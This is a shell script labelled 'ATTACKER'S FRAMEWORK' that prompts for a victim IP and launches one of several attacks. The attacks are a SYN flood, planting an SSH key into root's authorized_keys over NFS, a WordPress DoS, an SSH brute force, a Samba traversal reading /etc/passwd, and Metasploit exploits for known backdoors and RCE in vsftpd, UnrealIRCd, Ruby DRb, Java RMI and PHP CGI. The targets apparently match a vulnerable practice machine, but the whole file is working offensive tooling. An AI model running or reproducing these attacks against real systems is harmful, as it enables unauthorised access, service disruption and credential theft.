#!/bin/sh

Rset='\e[0m'    # Text Reset
Blu='\e[0;34m'
Yel='\e[0;33m'
Gre='\e[0;32m'
Red='\e[0;31m'

LOCALHOST="$(ifconfig | grep -A 1 'eth0' | tail -1 | cut -d ':' -f 2 | cut -d ' ' -f 1)"
#echo $LOCALHOST
NOW=$(date +"%T")
DIR=$(pwd)
/bin/echo -e "
${Gre}
------------------------------------------------
[*]Current system-time : $NOW
------------------------------------------------
${Rset}"

/bin/echo -e "${Yel}\n\n[*]Enter victim's IP [::Target Machine::]${Rset}"
read IP
/bin/echo -e "\n
${Gre}
   >>ATTACKER'S FRAMEWORK<<
-------------------------------------------------
1) Nmap Port Scanning
2) DoS/ TCP SYN flood
3) OpenSsh Exploit via NFS Service
4) Remote Code Execution (Ruby DRb RMI)
5) Remote Procedure Calls (RPC) (JAVA RMI Registry)
6) WordPress XMLRPC DoS
7) VSFTPD v2.3.4 Backdoor Command Execution
8) Apache Exploit via PHP CGI
9) Anonymous login (Samba client) backdoor exploit
10)Unrealircd 3.2.8.1 backdoor command execution
----------------------------------------------------
${Rset}
\n\n
"
/bin/echo -e "${Yel}[*]Enter a number between 1 and 11 [::Select your attack::]${Rset}"
read NUM
/bin/echo -e "${Gre}\n[*]Attack framework installed !\nIP :$LOCALHOST and Target IP:$IP\n${Rset}"

case $NUM in
	1) 	
		echo "[*]Enter port range 0 to 65535 [::Enter in this format(0-65535)::]"
		read PORT
		truncate -s 0 attack_framework/nmap.sh	
		echo "nmap -sV -v $IP -p $PORT" >> attack_framework/nmap.sh
		/bin/echo -e "${Blu}[*]Port Scan Is Running...${Rset}"
		sudo sh attack_framework/nmap.sh;;
	
	2) 	
		echo "[*]Enter port between 0 to 65535 [::Enter in this format(80)::]"
                read PORT
                truncate -s 0 attack_framework/ddos.sh
                echo "hping3 --flood -S -p $PORT $IP" >> attack_framework/ddos.sh
                /bin/echo -e "${Blu}[*]Ddos Attack Payload Is Running...${Rset}"
                sudo sh attack_framework/ddos.sh;;


	3)
                #rm -rf /tmp/r00t
                mkdir /tmp/r00t
                mount -t nfs $IP:/ /tmp/r00t/
                cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
                unmount /tmp/r00t

                ssh root@$IP ;;


	4)
		truncate -s 0 attack_framework/rubyrmi.rc
                echo "use exploit/linux/misc/drb_remote_codeexec" >> attack_framework/rubyrmi.rc
                echo "set URI druby://$IP:8787" >> attack_framework/rubyrmi.rc
                echo "set LHOST $LOCALHOST" >> attack_framework/rubyrmi.rc
                echo "set ExitOnSession false" >> attack_framework/rubyrmi.rc
                echo "exploit -j -z" >> attack_framework/rubyrmi.rc
                /bin/echo -e "${Blu}[*]RubyDB RMI Attack Payload Is Running...${Rset}"
                sudo msfconsole -r attack_framework/rubyrmi.rc;;

	5) 
		truncate -s 0 attack_framework/javarmi.rc
                echo "use exploit/multi/misc/java_rmi_server" >> attack_framework/javarmi.rc
                echo "set rhost $IP" >> attack_framework/javarmi.rc
        #       echo "set srvhost $LOCALHOST" >> attack_framework/javarmi.rc
	#	echo "set payload java/meterpreter/reverse_tcp" >> attack_framework/javarmi.rc
	#	echo "set lhost $LOCALHOST" >> attack_framework/javarmi.rc
        #       echo "set ExitOnSession false" >> attack_framework/javarmi.rc
                echo "run" >> attack_framework/javarmi.rc
		echo "run" >> attack_framework/javarmi.rc
                /bin/echo -e "${Blu}[*]JAVA RMI Attack Payload Is Running...${Rset}"
                sudo msfconsole -r attack_framework/javarmi.rc;;

	6)
		truncate -s 0 attack_framework/wordpressdos.rc
                echo "use auxiliary/dos/http/wordpress_xmlrpc_dos" >> attack_framework/wordpressdos.rc
                echo "set rhost $IP" >> attack_framework/wordpressdos.rc
                echo "set targeturi /wordpress" >> attack_framework/wordpressdos.rc
		echo "set ExitOnSession false" >> attack_framework/wordpressdos.rc
                echo "exploit -j -z" >> attack_framework/wordpressdos.rc
                /bin/echo -e "${Blu}[*]Wordpress DDos Attack Payload Is Running...${Rset}"
                sudo msfconsole -r attack_framework/wordpressdos.rc;;

	7)
		truncate -s 0 attack_framework/vsftpd.rc
                echo "use exploit/unix/ftp/vsftpd_234_backdoor" >> attack_framework/vsftpd.rc
                echo "set rhost $IP" >> attack_framework/vsftpd.rc
                echo "set ExitOnSession false" >> attack_framework/vsftpd.rc
                echo "exploit -j -z" >> attack_framework/vsftpd.rc
                /bin/echo -e "${Blu}[*]Vsftpd_backdoor Attack Payload Is Running...${Rset}"
                sudo msfconsole -r attack_framework/vsftpd.rc;;

	8)
                truncate -s 0 attack_framework/apache.rc
                echo "use exploit/multi/http/php_cgi_arg_injection" >> attack_framework/apache.rc
                echo "set rhost $IP" >> attack_framework/apache.rc
                echo "exploit -j -z" >> attack_framework/apache.rc
                /bin/echo -e "${Blu}[*]PHP_CGI Attack Payload Is Running...${Rset}"
                sudo msfconsole -r attack_framework/apache.rc;;

	9)
		truncate -s 0 attack_framework/samba.rc
                echo "use auxiliary/admin/smb/samba_symlink_traversal" >> attack_framework/samba.rc
                echo "set rhost $IP" >> attack_framework/samba.rc
		echo "set SMBSHARE tmp" >> attack_framework/samba.rc
                echo "set ExitOnSession false" >> attack_framework/samba.rc
                echo "exploit -j -z" >> attack_framework/samba.rc
		/bin/echo -e "${Gre}\n
		----------------------------------------
		Open new terminal and enter these commands:
			root@attacker:~#smbclient //$IP/tmp
			smb:\>cd rootfs
			smb:/rootfs\>cd etc
			smb:/rootfs/etc\>more passwd
		------------------------------------------\n\n${Rset}"
                /bin/echo -e "${Blu}[*]Samba client login Attack Payload Is Running...${Rset}"
		sudo msfconsole -r attack_framework/samba.rc;;
		
	10) 
		truncate -s 0 attack_framework/ircbd.rc
                echo "use exploit/unix/irc/unreal_ircd_3281_backdoor" >> attack_framework/ircbd.rc
                echo "set rhost $IP" >> attack_framework/ircbd.rc
                echo "set ExitOnSession false" >> attack_framework/ircbd.rc
                echo "exploit -j -z" >> attack_framework/ircbd.rc
                /bin/echo -e "${Blu}[*]IRC_backdoor Attack Payload Is Running...${Rset}"
                sudo msfconsole -r attack_framework/ircbd.rc;;
	
	11)
                truncate -s 0 attack_framework/openssh.rc
                echo "use auxiliary/scanner/ssh/ssh_login" >> attack_framework/openssh.rc
                echo "set rhosts $IP" >> attack_framework/openssh.rc
                echo "set userpass_file $DIR/attack_framework/bruteforce_user_pass.txt" >> attack_framework/openssh.rc
                echo "set ExitOnSession false" >> attack_framework/openssh.rc
                echo "exploit -j -z" >> attack_framework/openssh.rc
                /bin/echo -e "${Blu}[*]OpenSsh Attack Payload Is Running...${Rset}"
                sudo msfconsole -r attack_framework/openssh.rc;;


	*) /bin/echo -e "${Red}[*]INVALID NUMBER!${Rset}" ;;
esac
